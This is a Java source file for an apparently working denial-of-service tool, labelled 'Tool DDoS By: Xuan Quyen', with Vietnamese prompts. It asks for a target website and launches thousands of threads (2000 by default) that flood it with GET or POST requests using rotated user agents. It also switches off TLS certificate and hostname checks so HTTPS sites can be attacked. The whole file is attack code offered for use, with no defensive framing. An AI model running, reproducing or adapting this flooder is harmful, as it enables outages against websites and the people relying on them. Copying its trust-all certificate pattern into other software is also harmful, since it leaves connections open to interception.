import java.io.*;
import java.net.*;
import java.util.Scanner;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.security.cert.X509Certificate;
import javax.net.ssl.*;

public class Dos implements Runnable {

    private static List<String> userAgents = new ArrayList<>();
    private static final Random random = new Random();

    private static int amount = 0;
    private static String url = "";
    private int seq;
    private int type;

    // Cấu hình bỏ qua kiểm tra chứng chỉ SSL (Trust All)
    static {
        try {
            TrustManager[] trustAllCerts = new TrustManager[]{
                new X509TrustManager() {
                    public X509Certificate[] getAcceptedIssuers() { return null; }
                    public void checkClientTrusted(X509Certificate[] certs, String authType) {}
                    public void checkServerTrusted(X509Certificate[] certs, String authType) {}
                }
            };

            SSLContext sc = SSLContext.getInstance("SSL");
            sc.init(null, trustAllCerts, new java.security.SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            // Bỏ qua kiểm tra Hostname
            HostnameVerifier allHostsValid = new HostnameVerifier() {
                public boolean verify(String hostname, SSLSession session) { return true; }
            };
            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
        } catch (Exception e) {
            // Bỏ qua lỗi cấu hình SSL ban đầu
        }
    }

    public Dos(int seq, int type) {
        this.seq = seq;
        this.type = type;
    }

    private String getRandomUserAgent() {
        if (userAgents.isEmpty()) {
            return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
        }
        return userAgents.get(random.nextInt(userAgents.size()));
    }

    @Override
    public void run() {
        try {
            while (!Thread.currentThread().isInterrupted()) {
                try {
                    switch (this.type) {
                        case 1: postAttack(Dos.url); break;
                        case 2: sslPostAttack(Dos.url); break;
                        case 3: getAttack(Dos.url); break;
                        case 4: sslGetAttack(Dos.url); break;
                    }
                    Thread.sleep(10); 
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                } catch (Exception e) {
                    // Bỏ qua các lỗi kết nối/SSL để không làm đầy console
                }
            }
        } catch (Exception e) {
            // Kết thúc thread nếu có lỗi nghiêm trọng
        }
    }

    public static void main(String[] args) throws Exception {
        loadUserAgents("agent.txt");

        Scanner in = new Scanner(System.in);
        System.out.print("Nhập Link Website: ");
        String inputUrl = in.nextLine();
        if (inputUrl == null || inputUrl.isEmpty()) {
            System.out.println("URL không hợp lệ!");
            return;
        }
        Dos.url = inputUrl;
        
        System.out.println("\nĐang kiểm tra: " + Dos.url);

        String[] SUrl = Dos.url.split("://");
        if (SUrl.length < 2) {
            System.out.println("Định dạng URL sai (thiếu http:// hoặc https://)");
            return;
        }

        Dos checker = new Dos(0, 0);
        System.out.println("Đang kiểm tra Connection to Site...");
        try {
            if (SUrl[0].equalsIgnoreCase("http")) {
                checker.checkConnection(Dos.url);
            } else {
                checker.sslCheckConnection(Dos.url);
            }
        } catch (Exception e) {
            System.out.println("Không thể kết nối tới mục tiêu: " + e.getMessage());
        }

        System.out.println("Tool DDoS By: Xuan Quyen 𓆈 (Optimized & SSL Fixed)");

        System.out.print("Thread (Mặc định 2000): ");
        String amountStr = in.nextLine();
        if (amountStr == null || amountStr.trim().isEmpty()) {
            Dos.amount = 2000;
        } else {
            try {
                Dos.amount = Integer.parseInt(amountStr);
            } catch (NumberFormatException e) {
                Dos.amount = 2000;
            }
        }

        System.out.print("Method (get/post): ");
        String option = in.nextLine().toLowerCase();
        int ioption = 1;
        boolean isHttp = SUrl[0].equalsIgnoreCase("http");

        if (option.contains("get")) {
            ioption = isHttp ? 3 : 4;
        } else {
            ioption = isHttp ? 1 : 2;
        }

        System.out.println("Đang khởi tạo Thread Pool với " + Dos.amount + " threads...");
        ExecutorService executor = Executors.newFixedThreadPool(Dos.amount);

        System.out.println("Bắt Đầu Tấn Công!!! Nhấn Ctrl+C để dừng.");
        
        for (int i = 0; i < Dos.amount; i++) {
            executor.execute(new Dos(i, ioption));
        }

        try {
            executor.awaitTermination(Long.MAX_VALUE, TimeUnit.DAYS);
        } catch (InterruptedException e) {
            executor.shutdownNow();
        }
    }

    private static void loadUserAgents(String fileName) {
        System.out.println("Đang tải danh sách User Agents từ " + fileName + "...");
        try {
            File file = new File(fileName);
            if (file.exists()) {
                userAgents = Files.readAllLines(Paths.get(fileName));
                System.out.println("Đã tải " + userAgents.size() + " User Agents.");
            } else {
                System.out.println("Cảnh báo: Không tìm thấy tệp " + fileName + ". Sử dụng User Agent mặc định.");
            }
        } catch (IOException e) {
            System.out.println("Lỗi khi đọc tệp User Agent: " + e.getMessage());
        }
    }

    private void checkConnection(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", getRandomUserAgent());
        con.setConnectTimeout(5000);
        con.setReadTimeout(5000);

        int responseCode = con.getResponseCode();
        System.out.println("Website phản hồi mã: " + responseCode);
    }

    private void sslCheckConnection(String url) throws Exception {
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", getRandomUserAgent());
        con.setConnectTimeout(5000);
        con.setReadTimeout(5000);

        int responseCode = con.getResponseCode();
        System.out.println("Website phản hồi mã: " + responseCode);
    }

    private void postAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty("User-Agent", getRandomUserAgent());
        con.setRequestProperty("Accept-Language", "en-US,en;");
        con.setConnectTimeout(2000);
        con.setReadTimeout(2000);
        
        con.setDoOutput(true);
        try (DataOutputStream wr = new DataOutputStream(con.getOutputStream())) {
            wr.writeBytes("out of memory");
            wr.flush();
        }
        
        int responseCode = con.getResponseCode();
        System.out.println("POST attack done!: " + responseCode + " | Thread: " + this.seq);
        con.disconnect();
    }

    private void getAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", getRandomUserAgent());
        con.setConnectTimeout(2000);
        con.setReadTimeout(2000);

        int responseCode = con.getResponseCode();
        System.out.println("GET attack done!: " + responseCode + " | Thread: " + this.seq);
        con.disconnect();
    }

    private void sslPostAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty("User-Agent", getRandomUserAgent());
        con.setRequestProperty("Accept-Language", "en-US,en;");
        con.setConnectTimeout(2000);
        con.setReadTimeout(2000);

        con.setDoOutput(true);
        try (DataOutputStream wr = new DataOutputStream(con.getOutputStream())) {
            wr.writeBytes("out of memory");
            wr.flush();
        }
        
        int responseCode = con.getResponseCode();
        System.out.println("SSL POST attack done!: " + responseCode + " | Thread: " + this.seq);
        con.disconnect();
    }

    private void sslGetAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", getRandomUserAgent());
        con.setConnectTimeout(2000);
        con.setReadTimeout(2000);

        int responseCode = con.getResponseCode();
        System.out.println("SSL GET attack done!: " + responseCode + " | Thread: " + this.seq);
        con.disconnect();
    }
}
